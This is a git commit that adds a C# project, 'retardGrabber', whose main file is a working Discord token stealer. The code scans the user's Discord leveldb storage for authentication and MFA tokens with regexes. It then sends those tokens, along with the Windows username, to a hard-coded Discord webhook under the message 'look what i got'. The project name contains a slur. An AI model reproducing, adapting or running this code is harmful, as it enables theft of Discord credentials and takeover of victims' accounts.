6b9babe5a534a8bb390539729ae9555c7849d007
/⁶⁶⁶Bunti <58895443+Buntii@users.noreply.github.com>
2021-11-28 23:00:56 +0100

    yes
    yes

---
+++ retardGrabber/Program.cs
@@ -0,0 +1,90 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Collections.Specialized;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Text.RegularExpressions;
+
+namespace retardGrabber
+{
+    internal class Program
+    {
+        private const string V = $@"{{{nameof(GetDebuggerDisplay)}(),nq}}";
+        private static readonly string webhook = "https://discord.com/api/webhooks/889584577608314930/yf3rfA53pxeBj5h9zCrgKzOj7m8k3CpQ8rZ3p_I8pKz6b7FfniI6o9wnA1B8tBiab8jC"; // Your webhook goes here
+        private static bool foundSth;
+
+        private static void Main()
+        {
+            var msg = GetThem();
+            if (foundSth)
+            {
+                SendMeResults(msg);
+            }
+        }
+
+        public static List<string> GetThem()
+        {
+            List<string> discordtokens = new();
+#pragma warning disable CS8632 // Die Anmerkung für Nullable-Verweistypen darf nur in Code innerhalb eines #nullable-Anmerkungskontexts verwendet werden.
+            DirectoryInfo? rootfolder = new(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");
+#pragma warning restore CS8632 // Die Anmerkung für Nullable-Verweistypen darf nur in Code innerhalb eines #nullable-Anmerkungskontexts verwendet werden.
+
+            foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
+            {
+                string readedfile = file.OpenText().ReadToEnd();
+
+                foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
+                {
+                    discordtokens.Add(match.Value + "\n");
+                }
+
+                foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
+                {
+                    discordtokens.Add(match.Value + "\n");
+                }
+            }
+
+
+            discordtokens = discordtokens.ToList();
+
+            Console.WriteLine(discordtokens);
+
+            if (discordtokens.Count > 0)
+            {
+                foundSth = true;
+            }
+            else
+            {
+                discordtokens.Add("Empty");
+            }
+
+            return discordtokens;
+        }
+
+        private static void SendMeResults(List<string> message)
+        {
+            _ = Http.Post(webhook, new NameValueCollection()
+            {
+                { "username", "oops" },
+                { "avatar_url", "" },
+                { "content", "```\n" + "look what i got\n\n" + "Username: " + Environment.UserName + "\nTokens:\n\n" + string.Join("\n", message) + "\n```" }
+            });
+        }
+
+        private static object GetDebuggerDisplay()
+        {
+            throw new NotImplementedException();
+        }
+    }
+    class Http
+    {
+        public static byte[] Post(string uri, NameValueCollection pairs)
+        {
+#pragma warning disable SYSLIB0014 // Typ oder Element ist veraltet
+            using (WebClient webClient = new())
+#pragma warning restore SYSLIB0014 // Typ oder Element ist veraltet
+                return webClient.UploadValues(uri, pairs);
+        }
+    }
+}
---
+++ retardGrabber/Properties/AssemblyInfo.cs
@@ -0,0 +1,14 @@
+﻿using System.Reflection;
+using System.Runtime.InteropServices;
+[assembly: AssemblyTitle("retardGrabber")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("")]
+[assembly: AssemblyProduct("retardGrabber")]
+[assembly: AssemblyCopyright("Copyright ©  2021")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+[assembly: ComVisible(false)]
+[assembly: Guid("f6c82c93-4c36-4a77-8729-18785b304cf8")]
+[assembly: AssemblyVersion("1.0.0.0")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
